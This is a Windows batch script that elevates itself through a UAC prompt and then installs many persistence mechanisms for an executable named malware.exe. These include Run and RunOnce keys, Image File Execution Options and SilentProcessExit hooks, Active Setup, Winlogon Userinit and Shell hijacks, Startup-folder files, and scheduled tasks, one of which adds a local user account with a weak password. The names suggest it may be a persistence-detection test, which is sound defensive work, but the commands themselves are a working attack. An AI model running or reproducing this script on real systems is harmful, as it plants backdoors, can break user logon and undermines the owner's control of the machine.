@echo off
:: BatchGotAdmin
::-------------------------------------
REM  --> Check for permissions
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"="
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
::--------------------------------------
setlocal

:: Copy setup.bat into temp folder
copy /Y %~dp0setup.bat "C:\Windows\Temp\setup.bat"

:: Create registry keys for autorun
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 0x200 /f
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 0x1 /f
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /t REG_SZ /d c:\temp\malware.exe /f
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Malware /t REG_SZ /d c:\temp\malware.exe /f
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Malware /t REG_SZ /d c:\temp\malware.exe /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Malware /t REG_SZ /d c:\temp\malware.exe /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Malware /t REG_SZ /d c:\temp\malware.exe /f
reg add "HKLM\Software\Microsoft\Active Setup\Installed Components\{Malware}" /v StubPath /t REG_SZ /d c:\temp\malware.exe /f

:: Create registry keys for winlogin
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d c:\temp\malware.exe /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "explorer.exe, c:\temp\malware.exe" /f

:: Create files for Startup
echo "C:\Windows\System32\calc.exe" > "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\calc.bat"
echo "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" > "%appdata%\Microsoft\Windows\Start Menu\Programs\StartUp\powershell.bat"

:: Create scheduled tasks
SCHTASKS /CREATE /SC HOURLY /TN "System\Setup" /TR "C:\Windows\Temp\setup.bat" /F
SCHTASKS /CREATE /SC DAILY /TN "System\Nothing" /TR "cmd /C 'net user sus sus /add'" /RL HIGHEST /F

PAUSE
